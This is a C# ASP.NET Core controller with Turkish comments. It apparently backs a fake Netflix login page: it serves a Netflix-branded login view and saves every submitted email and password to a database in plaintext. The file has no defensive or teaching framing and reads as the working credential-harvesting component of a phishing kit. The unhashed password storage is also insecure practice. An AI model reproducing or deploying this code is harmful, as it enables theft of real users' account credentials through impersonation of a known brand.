 using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using WebApplicationProject.Models;


namespace WebApplicationProject.Controllers
{
    public class NetflixLoginController : Controller
    {
        private readonly WebDatabaseContext _context;
        private readonly ILogger<NetflixLoginController> _logger;

        public NetflixLoginController(WebDatabaseContext context, ILogger<NetflixLoginController> logger)
        {
            _context = context;
            _logger = logger;
        }
        public IActionResult Index()
        {
            return View("~/Views/NetflixLogin/NetflixLogin.cshtml");
        }


        [HttpPost]
        [ValidateAntiForgeryToken]
        public async Task<IActionResult> PostLogin(string Email, string Password)
        {
            if (!string.IsNullOrEmpty(Email) && !string.IsNullOrEmpty(Password))
            {
                // Veritabanına ekleme işlemi
                var NetflixLogin= new NetflixLogin
                    {
                    Email = Email, // Örnek olarak fname'i Email alanına atadım
                    Password = Password // Örnek olarak lname'i Password alanına atadım
                };

                _context.Add(NetflixLogin);
                await _context.SaveChangesAsync();
                return View("Index");
            }

            return BadRequest(); // Hata durumunda bad request dönebilirsiniz
        }

    }
}

